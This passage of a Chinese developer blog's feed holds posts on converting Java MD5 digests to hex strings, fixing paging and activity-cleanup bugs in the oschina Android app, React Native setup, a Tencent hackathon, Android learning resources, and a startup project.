class="line">       &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//128位整数分成了16份每份8位</span></span><br><span class="line">       byte[] digest = md5.digest(pass.getBytes());</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//由于有符号位,所以要处理下</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i : digest) &#123;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">//二进制存的是补码</span></span><br><span class="line">               i += <span class="number">256</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">               sb.append(<span class="string">"0"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           sb.append(Integer.toHexString(i));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//取16位</span></span><br><span class="line">       <span class="keyword">return</span> sb.toString().substring(<span class="number">8</span>, <span class="number">24</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>从第15行开始是重点，由于<code>byte</code>是有符号位的所以在截取的过程中可能会出现负数，对负数就要格外小心了。大家都知道在计算机中数字存储都采用补码，在<code>byte</code>转<code>int</code>的时候一个占8位，一个占32位，虽然转换的时候值是不变的，但是那一长串字符却会发生变化，而我们需要的就是那一长串字符串，所以我们需要把转换后多余的那串字符截取掉。</p>
<p>当然只有在小于0的情况下才需要截取，大于0不需要，因为正数补码就是本身。<br>至于为什么<code>+256</code>，我在草稿纸上证明了一下，因为256正好是2^8是8位二进制的模，所以加上256前面多余的字符就全部变成0了，这样<code>toHexString</code>的时候就不会出问题了。</p>
<p>当大于0小于16的时候，需要在前面补0，这不需要解释了吧。</p>
<h1 id="2-__26amp_3B0xff"><a href="#2-__26amp_3B0xff" class="headerlink" title="2. &amp;0xff"></a>2. &amp;0xff</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5_2</span><span class="params">(String pass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//128位整数分成了16份每份8位</span></span><br><span class="line">       byte[] digest = md5.digest(pass.getBytes());</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//由于有符号位,所以要处理下</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i : digest) &#123;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">//二进制存的是补码</span></span><br><span class="line">               i = i &amp; <span class="number">0xff</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">               sb.append(<span class="string">"0"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           sb.append(Integer.toHexString(i));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//取16位</span></span><br><span class="line">       <span class="keyword">return</span> sb.toString().substring(<span class="number">8</span>, <span class="number">24</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这个方法和上一个其实类似，区别在于截取的方式不一样，一个是用<code>+256</code>的方式，而这个是用&amp;上ff的方式，同样是截取后8位。</p>
<h1 id="3-__u76F4_u63A5_u79FB_u4F4D"><a href="#3-__u76F4_u63A5_u79FB_u4F4D" class="headerlink" title="3. 直接移位"></a>3. 直接移位</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5_3</span><span class="params">(String pass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> hexDigits[] = &#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//128位整数分成了16份每份8位</span></span><br><span class="line">        byte[] digest = md5.digest(pass.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> c[] = <span class="keyword">new</span> <span class="keyword">char</span>[digest.length * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : digest) &#123;</span><br><span class="line"></span><br><span class="line">            c[j++] = hexDigits[i &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">0xf</span>];</span><br><span class="line">            c[j++] = hexDigits[i &amp; <span class="number">0xf</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这种方式采用了直接移位的方式，不转换成int所以也不需要进行截取操作了。</p>
<p>关于byte转int的详细介绍这里给出一篇我看过，自认为不错的blog：<br><a href="http://www.blogjava.net/orangelizq/archive/2008/07/20/216228.html" target="_blank" rel="external">http://www.blogjava.net/orangelizq/archive/2008/07/20/216228.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[javamd5转hexString的小细节]]>
    
    </summary>
    
      <category term="md5" scheme="http://www.xuanzhangjiong.xyz/tags/md5/"/>
    
      <category term="java" scheme="http://www.xuanzhangjiong.xyz/categories/java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第一次开源贡献成功]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/12/25/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E6%88%90%E5%8A%9F/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/12/25/第一次开源贡献成功/</id>
    <published>2015-12-25T09:23:01.000Z</published>
    <updated>2015-12-30T11:27:18.000Z</updated>
    <content type="html"><![CDATA[<h1 id="u7B80_u4ECB"><a href="#u7B80_u4ECB" class="headerlink" title="简介"></a>简介</h1><p>前一阵子做项目，没少看<code>oschina-android-app</code>这个开源项目，看久了，似乎也发现了其中的一些小问题，主要的问题大概有2个：</p>
<ol>
<li><p>列表缓存的Bug，在无网络的时候，滚动到底部时，当前的页数先自加了，然而在失败的时候却未减回来，如果刻意在无网络的情况下不断上拉，会出现严重的漏页现象。</p>
</li>
<li><p>管理Activity销毁的AppManager的中销毁activity不完全，存在部分activity未销毁的情况。</p>
</li>
</ol>
<h1 id="Bug_u51FA_u73B0_u7684_u8FC7_u7A0B"><a href="#Bug_u51FA_u73B0_u7684_u8FC7_u7A0B" class="headerlink" title="Bug出现的过程"></a>Bug出现的过程</h1><h2 id="u7F13_u5B58_u5217_u8868_u6F0F_u9875_u73B0_u8C61"><a href="#u7F13_u5B58_u5217_u8868_u6F0F_u9875_u73B0_u8C61" class="headerlink" title="缓存列表漏页现象"></a>缓存列表漏页现象</h2><p>开源中国项目中的分页缓存机制的实现是在BaseListFragment中实现的.</p>
<p>首先在<code>onCreateView</code>中调用<code>initView</code>方法里的<code>requestData()</code>,如果没有网络则读取对应分页的缓存，如果有网络且不是主动下拉刷新，则判断是否为第一页，如果是第一页，则优先读取缓存，如果不是第一页，如果缓存存在切没有失效，则优先读取缓存（Wi-Fi环境下缓存时间为5分钟，其他网络环境为1小时），每个半天会自动刷新一次。</p>
<p>当列表滚动到最下面的时候当前页数自动加1，但是当请求失败的时候执行<code>executeOnLoadDataError</code>方法时，并未将当前页数减回来，导致重复下拉的时候，当前分页不断增加。当有网络加载的时候，中间漏掉n页。所以最简单的解决办法，直接减回来。<br>看似没有难度，但是这个缓存机制，我也看了好几天才理清楚其中的原理。</p>
<p>修改后的代码片段：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">void</span> <span class="title">executeOnLoadDataError</span><span class="params">(String <span class="keyword">error</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mCurrentPage == <span class="number">0</span></span><br><span class="line">            &amp;&amp; !CacheManager.isExistDataCache(getActivity(), getCacheKey())) &#123;</span><br><span class="line">        mErrorLayout.setErrorType(EmptyLayout.NETWORK_ERROR);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//在无网络时，滚动到底部时，mCurrentPage先自加了，然而在失败时却</span></span><br><span class="line">      <span class="comment">//没有减回来，如果刻意在无网络的情况下上拉，可以出现漏页问题</span></span><br><span class="line">      <span class="comment">//find by TopJohn</span></span><br><span class="line">        mCurrentPage--;</span><br><span class="line"></span><br><span class="line">        mErrorLayout.setErrorType(EmptyLayout.HIDE_LAYOUT);</span><br><span class="line">        mAdapter.setState(ListBaseAdapter.STATE_NETWORK_ERROR);</span><br><span class="line">        mAdapter.notifyDataSetChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="u90E8_u5206Activity_u672A_u9500_u6BC1"><a href="#u90E8_u5206Activity_u672A_u9500_u6BC1" class="headerlink" title="部分Activity未销毁"></a>部分Activity未销毁</h2><p><code>oschina-android-app</code>这个开源项目的Activity采用AppManager这个类进行管理，内部维护了一个Activity的堆栈，采用单例模式，从而可以轻易销毁所有Activity.</p>
<p>原来的代码如下：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line">  * 结束所有Activity</span><br><span class="line">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> finishAllActivity() &#123;</span><br><span class="line">     <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>, <span class="built_in">size</span> = activityStack.<span class="built_in">size</span>(); i &lt; <span class="built_in">size</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">null</span> != activityStack.<span class="built_in">get</span>(i)) &#123;</span><br><span class="line">           finishActivity(activityStack.<span class="built_in">get</span>(i));</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     activityStack.<span class="built_in">clear</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>先不说<code>finishActivity</code>方法有没有错，在第一次循环的时候就有 <code>break;</code>语句了，也就是说，最多也就销毁一个Activity，所以我把它注视掉。本以为问题可以轻松解决，但是发现我在使用的过程中，总是有那么几个<code>Activity</code>没有被销毁。</p>
<p>finishActivity源码:</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * 结束指定的Activity</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">finishActivity</span>(<span class="params">Activity activity</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (activity != <span class="keyword">null</span> &amp;&amp; !activity.isFinishing()) &#123;</span><br><span class="line">        activityStack.remove(activity);</span><br><span class="line">        activity.finish();</span><br><span class="line">        activity = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试修改了其中的代码，去猜测这个bug的由来，发现去掉<code>activity.isFinishing</code>方法就可以全部销毁，<code>activity.isFinishing</code>这个方法是判断activity是否正在被销毁，或者暂停，但是不知道为什么，某些activity会出现这个状态，从而导致判断的时候漏掉了几个activity，产生了历史遗留，所以干脆点直接去掉判断，就能完全销毁了。</p>
<h1 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h1><p>在做完一个项目，或者长时间敲代码的过程中，最好停下来，好好休整下，有空多去看看开源项目中的源码，不仅能看到别人是如何编码的，而且当发现其中的问题的时候，你也可以尝试着去修改其中的代码，为开源贡献自己的力量。</p>
<p>终于贡献了自己的处女作了,也是头一次在开源项目中的git log中看到自己的提交。</p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/open_source_1.jpg" alt=""></p>
<p>项目地址：<br><a href="http://git.oschina.net/oschina/android-app" target="_blank" rel="external">http://git.oschina.net/oschina/android-app</a></p>
]]></content>
    <summary type="html">
    <![CDATA[在开源中国上学习了好久了，上面的帖子博客也看了N篇，开源项目，也借鉴了不少，第一次在oschina上发起Pull Request，也希望自己为开源做点小贡献。]]>
    
    </summary>
    
      <category term="oschina-android-app" scheme="http://www.xuanzhangjiong.xyz/tags/oschina-android-app/"/>
    
      <category term="开源贡献" scheme="http://www.xuanzhangjiong.xyz/categories/%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[React-Native之入坑经历]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/12/24/React-Native%E4%B9%8B%E5%85%A5%E5%9D%91%E7%BB%8F%E5%8E%86/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/12/24/React-Native之入坑经历/</id>
    <published>2015-12-24T10:59:21.000Z</published>
    <updated>2016-01-12T02:45:09.000Z</updated>
    <content type="html"><![CDATA[<p>这几天一直很郁闷，React-Native环境搭建比较坎坷，<code>npm</code>换源了之后效果依然不佳，翻过了厚厚的围墙，也是龟速，npm倒还好，不得不吐槽下，<code>atom</code>，<code>apm</code>安装插件比搭Android还慢，而且<code>atom</code>装多了插件就会很卡。</p>
<p>过了N小时，总算搭建完了，想跑个HelloWorld，但是发现在传输本地服务器的js文件时总是<code>Unable to download JS bundle</code>，尝试了<code>GitHub</code>上的<code>Issue</code>，和<code>StackOverFlow</code>上的解答依然无果。就这样耗了几天，今天在React中文论坛上看到一篇帖子说<code>0.18.0-rc</code>版有问题，然后看了一下自己的，果然是这个版本，出于试试看的心态，我把它换成了<code>0.17.0</code>，就可以跑的通了。</p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native-%E5%85%A5%E5%9D%91_1.jpg" alt=""><br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native-%E5%85%A5%E5%9D%91_2.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[每次尝试一项新技术总是会有小挫折。。]]>
    
    </summary>
    
      <category term="入坑经历" scheme="http://www.xuanzhangjiong.xyz/tags/%E5%85%A5%E5%9D%91%E7%BB%8F%E5%8E%86/"/>
    
      <category term="React Native" scheme="http://www.xuanzhangjiong.xyz/categories/React-Native/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[参加腾讯Innovation Space比赛的感想]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/12/20/%E5%8F%82%E5%8A%A0%E8%85%BE%E8%AE%AFInnovation-Space%E6%AF%94%E8%B5%9B%E7%9A%84%E6%84%9F%E6%83%B3/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/12/20/参加腾讯Innovation-Space比赛的感想/</id>
    <published>2015-12-20T05:45:52.000Z</published>
    <updated>2016-01-08T05:55:31.000Z</updated>
    <content type="html"><![CDATA[<p>2015年11月26日，我和几个小伙伴带着创意在线报名了腾讯的Innovation Space 比赛，几经筛选，我们从270多个创意中，进入了总决赛。</p>
<p>12月11日，我们背上行囊奔赴上海腾讯，当然这也是第一次去腾讯，内心很激动。</p>
<p>12月11日傍晚，腾讯的HR姐姐，带我们参观了上海腾讯的腾云大厦，以及比赛团队的介绍。</p>
<p>12月12日上午，经历了半天的商业模式的洗礼。到了下午我们开始了58小时的封闭式开发。哦，忘了介绍我们的团队了：一名腾讯的产品姐姐，一名腾讯的前端大牛，一名上大的研究生学长（后端开发），以及3名浙大的骚年，一名iOS开发，一名设计，还有做Android的我。</p>
<p>我们做的产品是<code>刷脸加好友</code>,在那58小时里，我们配合的很默契，其中也出现了很多的问题：特别吐槽下腾讯的GuestWifi,慢的和乌龟一样，而且莫名地不定时地局域网无法ping通，在调试接口的时候，我们几经崩溃。最后迫于无奈，用的手机热点来，调试，是不是醉了，哈哈。</p>
<p>58小时里，我们几乎都没怎么睡觉，一直在14号中午快开始路演的时候还在调试，心好累。。。。</p>
<p>刷脸加好友的创意首先是来自于我们发现了腾讯的优图接口，我们想利用优图实现传统加好友的局限性，能够仅仅通过一张老照片，对仅仅只有一面之缘的又无法联系到的人通过社交平台添加好友，这是我们的初衷。</p>
<p>说了半天，获奖没，并没有，当路演完，评审完，我们意识到了，哦，原来商业模式也是很重要的，不仅创意要好，产品要做出来，而且要能够让投资人能够了解到创意背后的商业价值，好吧，也许我们在这方面思考欠佳。</p>
<p>但是这并不影响我对这次比赛的感受，还是很值得的，体验了58小时的封闭式开发，感受了BAT之一的大公司，了解了一个公司，认识了这么多小伙伴。</p>
<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/innovation_space.png" alt="附上一张合照" title="合照"></p>
<p>项目的客户端代码已经放到我的Github上了，需要的小伙伴可以自己下载，做的比较简陋，毕竟只有58小时，希望不要见怪。</p>
<p>当然无图无真相：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_5.jpg?imageView2/2/w/360/h/640" alt="">    <img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_4.jpg?imageView2/2/w/360/h/640" alt=""><br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_3.jpg?imageView2/2/w/360/h/640" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_6.jpg?imageView2/2/w/360/h/640" alt=""><br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_2.jpg?imageView2/2/w/360/h/640" alt=""> <img src="http://7xoz2q.com1.z0.glb.clouddn.com/faceswiping_1.jpg?imageView2/2/w/360/h/640" alt=""><br><br></p>
<p>Git地址：<a href="/&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x67;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#109;&#x3a;&#84;&#x6f;&#112;&#x4a;&#x6f;&#104;&#110;&#47;&#102;&#x61;&#x63;&#101;&#83;&#x77;&#x69;&#x70;&#105;&#x6e;&#x67;&#46;&#x67;&#x69;&#x74;">&#x67;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#109;&#x3a;&#84;&#x6f;&#112;&#x4a;&#x6f;&#104;&#110;&#47;&#102;&#x61;&#x63;&#101;&#83;&#x77;&#x69;&#x70;&#105;&#x6e;&#x67;&#46;&#x67;&#x69;&#x74;</a></p>
]]></content>
    <summary type="html">
    <![CDATA[虽然并没有获奖，但是认识了一群小伙伴，经历了，很值得...]]>
    
    </summary>
    
      <category term="生活感言" scheme="http://www.xuanzhangjiong.xyz/tags/%E7%94%9F%E6%B4%BB%E6%84%9F%E8%A8%80/"/>
    
      <category term="项目经历" scheme="http://www.xuanzhangjiong.xyz/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/"/>
    
      <category term="作品" scheme="http://www.xuanzhangjiong.xyz/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/%E4%BD%9C%E5%93%81/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android技术贴总汇]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/12/19/android%E5%AD%A6%E4%B9%A0%E6%80%BB%E6%B1%87/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/12/19/android学习总汇/</id>
    <published>2015-12-19T08:12:38.000Z</published>
    <updated>2015-12-19T11:53:04.000Z</updated>
    <content type="html"><![CDATA[<p>收藏夹里积攒了好多自己喜欢的blog和帖子，是时候找个时间整理下了，方便他人学习，为他人填坑，也方便自己以后的回顾，so,let’s begin…</p>
<ul>
<li><p><a href="http://www.stormzhang.com/android/2014/07/07/learn-android-from-rookie/" target="_blank" rel="external">Android学习之路</a>从android开发入门，到后来的进阶，stormzhang提供了许多自己宝贵的经验，值得拜读。</p>
</li>
<li><p><a href="http://tech.meituan.com/" target="_blank" rel="external">美团技术团队</a>美团在做一些技术上的分享，在国内属于领先的地位，里面有一些和移动开发相关高质量文章。</p>
</li>
<li><p><a href="http://bugly.qq.com/blog/" target="_blank" rel="external">腾讯Bugly博客</a>腾讯Bugly博客</p>
</li>
<li><p><a href="http://tools.android.com/recent" target="_blank" rel="external">Recent Changes</a>了解Android新动态，需要翻墙。</p>
</li>
<li><p><a href="http://androidweekly.net/" target="_blank" rel="external">Android Weekly</a>Android周报，英文，邮箱订阅。</p>
</li>
<li><p><a href="http://www.androidweekly.cn/" target="_blank" rel="external">Android 开发技术周报</a>国内的开发周报。</p>
</li>
<li><p><a href="http://www.androiddevtools.cn/" target="_blank" rel="external">AndroidDevTools</a>提供了不翻墙下载Android相关工具的服务。</p>
</li>
<li><p><a href="http://android-developers.blogspot.ca/" target="_blank" rel="external">Android Blog</a>Android 官方的开发博客。</p>
</li>
<li><p><a href="http://developer.android.com/intl/zh-cn/index.html" target="_blank" rel="external">Android官网</a>官网对开发者提供了许多教程以及开发实例，坚持阅读，相信会受益匪浅。毋庸置疑，官网需要翻墙。</p>
</li>
<li><p><a href="https://github.com/pcqpcq/open-source-android-apps" target="_blank" rel="external">Android开源项目</a>提供了众多不同领域的开源项目，值得学习。</p>
</li>
<li><p><a href="http://www.jianshu.com/p/1078568e859f" target="_blank" rel="external">Android Material Design 最佳实践项目</a>对于Material Design众多组件的使用给出了详细的讲解说明，是MD入门的利器。</p>
</li>
<li><p><a href="http://v.youku.com/v_show/id_XODk2NjkwNjM2.html?f=23494296&amp;from=y1.7-1.3" target="_blank" rel="external">Android 性能模式 第一季(中字幕)</a>Google官方推出的性能优化视频，第一季。最初发布在Youtube，Google为了方便天朝人民观看，在优酷上也放了一份。</p>
</li>
<li><p><a href="http://v.youku.com/v_show/id_XMTMxNDIzODcxMg==.html?f=26016201&amp;from=y1.7-3" target="_blank" rel="external">Android 性能模式 第二季(中字幕)</a>Google官方推出的性能优化视频，第二季。</p>
</li>
<li><p><a href="http://v.youku.com/v_show/id_XMTMwMTYzNDQwMA==.html?f=25972284&amp;from=y1.7-3" target="_blank" rel="external">Android 性能模式 第三季(英字幕)</a>Google官方推出的性能优化视频，第三季。</p>
</li>
<li><p><a href="http://v.youku.com/v_show/id_XMTM1OTI3NDE2NA==.html?f=26144822&amp;from=y1.7-3" target="_blank" rel="external">Android 性能模式 第四季(英字幕)</a>Google官方推出的性能优化视频，第四季。</p>
</li>
<li><p><a href="http://hukai.me/" target="_blank" rel="external">胡凯的博客</a>胡凯大神，腾讯Android高级开发，做了许多优质的分享，发起了翻译Android Training Course的活动。</p>
</li>
<li><p><a href="http://a.codekk.com/" target="_blank" rel="external">CodeKK</a>国内Android开源领袖级的人物，博客中有许多眼前一亮的干货。</p>
</li>
<li><p><a href="http://litesuits.com/" target="_blank" rel="external">Lite Your Android</a>博主倡导极简生活，开源了一些极简概念的Android库。</p>
</li>
<li><p><a href="http://www.vmatianyu.cn/" target="_blank" rel="external">Liter’s Blog</a>这是上一条推荐项目的博主的个人博客，前辈的博文语重心长，非常诚恳。</p>
</li>
<li><p><a href="http://keeganlee.me/" target="_blank" rel="external">Keegan小钢</a>博客中又对Android动画以及项目重构的实战讲解。</p>
</li>
<li><p><a href="http://it.deepinmind.com/index.html" target="_blank" rel="external">Java基础及深入</a>非常棒的一个博客，有关Java学习的博文质量很高。</p>
</li>
<li><p><a href="http://www.itechzero.com/google-mirror-sites-collect.html" target="_blank" rel="external">Google镜像集合</a>持续更新，让你不翻墙也可以用Google搜索。</p>
</li>
<li><p><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/v3.0.html" target="_blank" rel="external">知道创宇研发技能表v3.0</a>对于Programer或者Geeker来说，这个技能表是必备的。</p>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[平时发现的优质blog和技术贴，会持续更新]]>
    
    </summary>
    
      <category term="Android进阶优质资源" scheme="http://www.xuanzhangjiong.xyz/tags/Android%E8%BF%9B%E9%98%B6%E4%BC%98%E8%B4%A8%E8%B5%84%E6%BA%90/"/>
    
      <category term="Android" scheme="http://www.xuanzhangjiong.xyz/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[柚子房东，第一个从无到有的创业项目]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/12/01/%E6%9F%9A%E5%AD%90%E6%88%BF%E4%B8%9C%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BB%8E%E6%97%A0%E5%88%B0%E6%9C%89%E7%9A%84%E5%88%9B%E4%B8%9A%E9%A1%B9%E7%9B%AE/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/12/01/柚子房东，第一个从无到有的创业项目/</id>
    <published>2015-12-01T06:52:05.000Z</published>
    <updated>2016-01-08T05:55:45.000Z</updated>
    <content type="html"><![CDATA[<p>开篇先贴个网站首页先：<br><a href="http://www.inyouzi.com" target="_blank" rel="external">http://www.inyouzi.com</a></p>
<p>七月中旬，在和导师的一番交流后，我加入了<code>柚子房东</code>这个项目，其实当时还不叫这个名字，叫<code>V-house</code>，来到了苏州金鸡湖边的一个酒店和一群从事房地产的人开始了我们的创业之路。</p>
<p>记得当时，大学还刚毕业不久，便开始了长达一个多月的酒店式封闭开发。</p>
<p>7月中旬，当时产品还没有确定最终的方向，大佬们还在讨论公司走向，作为码农，我只好先开始了各种填坑工作，对各种技术进行调研。一开始，我们曾经想过用<a href="http://ionicframework.com/" target="_blank" rel="external">Ionic</a>来开发，毕竟Hybrid的开发速度比原生的会快很多。在试过水之后，发现在没有遇到重大技术障碍的时候，Hybrid的应用确实可以迅速开发出来。但是遇到在用刀第三方服务的时候就会发现虽然有些第三方服务是支持<code>Codova</code>，但是遇到那些不支持的时候，开发显然会遇到问题，当然并不是说不可行，可以用Js去调用原生的API。在体验过一些用Ionic开发的项目之后发现，用户体验太！差！了！于是乎，果断放弃了这个坑，当然，那个时候还没有出现React Native不然，我可能会…</p>
<p>言归正传，当时由于之前一直使用Eclipse进行开发，但是Eclipse的效率真的不敢恭维，Android Studio也比较成熟了，所以打算从这个项目入手，我的Android Studio填坑之路也开始了。</p>
<h1 id="u4E00_u3001_u524D_u671F_u7684_u6280_u672F_u8C03_u7814"><a href="#u4E00_u3001_u524D_u671F_u7684_u6280_u672F_u8C03_u7814" class="headerlink" title="一、前期的技术调研"></a>一、前期的技术调研</h1><p>在项目开始之前，调研了相关的第三方服务</p>
